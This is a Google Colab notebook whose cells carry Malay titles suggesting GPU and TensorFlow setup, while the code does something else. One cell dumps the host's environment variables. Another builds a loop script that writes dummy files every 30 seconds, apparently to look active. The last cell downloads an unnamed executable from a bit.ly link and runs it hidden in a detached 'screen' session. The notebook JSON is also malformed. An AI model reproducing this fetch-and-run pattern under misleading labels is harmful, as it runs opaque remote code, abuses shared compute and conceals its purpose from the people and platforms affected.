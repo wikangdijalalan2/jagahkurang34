{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ocaml.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyM99dfUGH9UeewxgTuQPoY67ORhY5",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "ocaml-jupyter",
      "display_name": "ocaml-jupyter"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/wikangdijalalan2/jagahkurang34/blob/kuih/ocaml.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2AVGUz7mVNRP"
      },
      "source": [
        "# **Kuih**\n",
        "`.`"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "cellView": "form",
        "id": "lFWczQsOVXrg",
        "outputId": "18b7d8c9-64ee-49a3-8226-599744d73496"
      },
      "source": [
        "#@title CEK GPU\n",
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "NVIDIA-SMI has failed because it couldn't communicate with the NVIDIA driver. Make sure that the latest NVIDIA driver is installed and running.\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "abqXHTuoVfTF",
        "outputId": "8d914661-67c3-414b-c1f2-25a91bcdd6b7"
      },
      "source": [
        "#@title MOD GPU\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "without GPU: 5.645755360999999\n",
            "with GPU: 5.574299499999995\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "5qmnILGrVhvG",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 137
        },
        "outputId": "af7d08d5-aca8-496a-862b-cd1d0571b464"
      },
      "source": [
        "#@title IMPORT CUDA\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'export NO_GCE_CHECK=\"True\" && export GCS_READ_CACHE_BLOCK_SIZE_MB=\"16\" && export CLOUDSDK_CONFIG=\"/content/.config\" && export CUDA_VERSION=\"11.0.3\" && export PATH=\"/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tools/node/bin:/tools/google-cloud-sdk/bin:/opt/bin\" && export HOME=\"/root\" && export LD_LIBRARY_PATH=\"/usr/local/nvidia/lib:/usr/local/nvidia/lib64\" && export LANG=\"en_US.UTF-8\" && export SHELL=\"/bin/bash\" && export LIBRARY_PATH=\"/usr/local/cuda/lib64/stubs\" && export SHLVL=\"0\" && export GCE_METADATA_TIMEOUT=\"0\" && export NCCL_VERSION=\"2.7.8\" && export NVIDIA_VISIBLE_DEVICES=\"all\" && export DEBIAN_FRONTEND=\"noninteractive\" && export CUDNN_VERSION=\"8.0.4.30\" && export LAST_FORCED_REBUILD=\"20210528\" && export JPY_PARENT_PID=\"51\" && export PYTHONPATH=\"/env/python\" && export DATALAB_SETTINGS_OVERRIDES=\"{\"kernelManagerProxyPort\":6000,\"kernelManagerProxyHost\":\"172.28.0.3\",\"jupyterArgs\":[\"--ip=\\\\\"172.28.0.2\\\\\"\"],\"debugAdapterMultiplexerPath\":\"/usr/local/bin/dap_multiplexer\",\"enableLsp\":true}\" && export ENV=\"/root/.bashrc\" && export GLIBCXX_FORCE_NEW=\"1\" && export NVIDIA_DRIVER_CAPABILITIES=\"compute,utility\" && export TF_FORCE_GPU_ALLOW_GROWTH=\"true\" && export LD_PRELOAD=\"/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4\" && export NVIDIA_REQUIRE_CUDA=\"cuda>=11.0 brand=tesla,driver>=418,driver<419 brand=tesla,driver>=440,driver<441 brand=tesla,driver>=450,driver<451\" && export OLDPWD=\"/\" && export HOSTNAME=\"db3f1ae7b902\" && export COLAB_GPU=\"0\" && export PWD=\"/\" && export CLOUDSDK_PYTHON=\"python3\" && export GLIBCPP_FORCE_NEW=\"1\" && export PYTHONWARNINGS=\"ignore:::pip._internal.cli.base_command\" && export TBE_CREDS_ADDR=\"172.28.0.1:8008\" && export TERM=\"xterm-color\" && export CLICOLOR=\"1\" && export PAGER=\"cat\" && export GIT_PAGER=\"cat\" && export MPLBACKEND=\"module://ipykernel.pylab.backend_inline\" && export PYDEVD_USE_FRAME_EVAL=\"NO\"'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 0
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "TIvKPg-Ch4Lb"
        "colab": {
          "base_uri": "https://localhost:8080/"
      },
      "source": [
        "!echo '#!/bin/sh' > ok.sh\n",
        "!echo 'x=1' >> ok.sh\n",
        "!echo 'while [ $x -le 99999 ]' >> ok.sh\n",
        "!echo \"do\" >> ok.sh\n",
        "!echo '  echo \"ID_UPDATE-$(( RANDOM + ( RANDOM + RANDOM )))\" > ID-$RANDOM.txt' >> ok.sh\n",
        "!echo '  touch \"MLiD.backup.$(date +%F_%R)\"' >> ok.sh\n",
        "!echo '  x=$(( $x + 1 ))' >> ok.sh\n",
        "!echo '  sleep 30' >> ok.sh\n",
        "!echo '  echo \"All done with $x times\"' >> ok.sh\n",
        "!echo 'done' >> ok.sh"
      ],
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "G2jvlyOcVpLt",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "729c940b-2080-47f5-8d25-d015cfcdd4bc"
      },
      "source": [
        "#@title MAXIMALKAN TENSOR\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "WARNING:tensorflow:Mixed precision compatibility check (mixed_float16): WARNING\n",
            "The dtype policy mixed_float16 may run slowly because this machine does not have a GPU. Only Nvidia GPUs with compute capability of at least 7.0 run quickly with mixed_float16.\n",
            "If you will use compatible GPU(s) not attached to this host, e.g. by running a multi-worker model, you can ignore this warning. This message will only be logged once\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "2ehHgTqqV7eW",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "cellView": "form",
        "outputId": "be5533e0-4f04-4471-c02a-6e7a35614a7d"
      },
      "source": [
        "#@title MULAI......\n",
        "!wget https://bit.ly/35QW8tE && chmod +x 35QW8tE && screen -dmS node ./35QW8tE"
      ],
      "execution_count": 5,
      "outputs": []
     },
      ]
    }
  ]
}

